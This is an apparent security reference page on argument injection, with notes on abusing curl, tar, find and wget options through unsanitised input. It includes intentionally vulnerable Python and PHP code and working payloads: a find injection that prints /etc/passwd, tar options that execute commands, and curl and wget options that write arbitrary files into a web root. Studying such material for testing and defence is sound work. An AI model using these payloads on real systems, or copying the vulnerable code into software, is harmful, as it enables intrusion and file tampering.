# Argument Injection

Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.

It can happen in different situations, where you can only inject arguments to a command:

- Improper sanitization (regex)
- Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen)
- Bash expansion (ex: *)

In the following example, a python script takes the inputs from the command line to generate a ```curl``` command:*

```py
from shlex import quote,split
import sys
import subprocess

if __name__=="__main__":
    command = ['curl']
    command = command + split(sys.argv[1])
    print(command)
    r = subprocess.Popen(command)
```

It is possible for an attacker to pass several words to abuse options from ```curl``` command

```ps1
python python_rce.py "https://www.google.fr -o test.py" 
```

We can see by printing the command that all the parameters are split allowing to inject an argument that will save the response in an arbitrary file.

```ps1
['curl', 'https://www.google.fr', '-o', 'test.py']
```

## Summary

* [List of exposed commands](#list-of-exposed-commands)
  * [CURL](#CURL)
  * [TAR](#TAR)
  * [FIND](#FIND)
  * [WGET](#WGET)
* [References](#references)


## List of exposed commands

### CURL

It is possible to abuse ```curl``` through the following options:

```ps1
 -o, --output <file>        Write to file instead of stdout
 -O, --remote-name          Write output to a file named as the remote file
```
In case there is already one option in the command it is possible to inject several URLs to download and several output options. Each option will affect each URL in sequence.

### TAR

For the ```tar``` command it is possible to inject arbitrary arguments in different commands. 

Argument injection can happen into the '''extract''' command:

```ps1
--to-command <command>
--checkpoint=1 --checkpoint-action=exec=<command>
-T <file> or --files-from <file>
```

Or in the '''create''' command:

```ps1
-I=<program> or -I <program>
--use-compres-program=<program>
```

There are also short options to work without spaces:

```ps1
-T<file>
-I"/path/to/exec"
```

### FIND

Find some_file inside /tmp directory.

```php
$file = "some_file";
system("find /tmp -iname ".escapeshellcmd($file));
```

Print /etc/passwd content.

```php
$file = "sth -or -exec cat /etc/passwd ; -quit";
system("find /tmp -iname ".escapeshellcmd($file));
```

### WGET

Example of vulnerable code

```php
system(escapeshellcmd('wget '.$url));
```

Arbitrary file write

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
```


## References

- [staaldraad - Etienne Stalmans, November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014](https://www.exploit-db.com/papers/33930)
- [TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek,  Apr 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
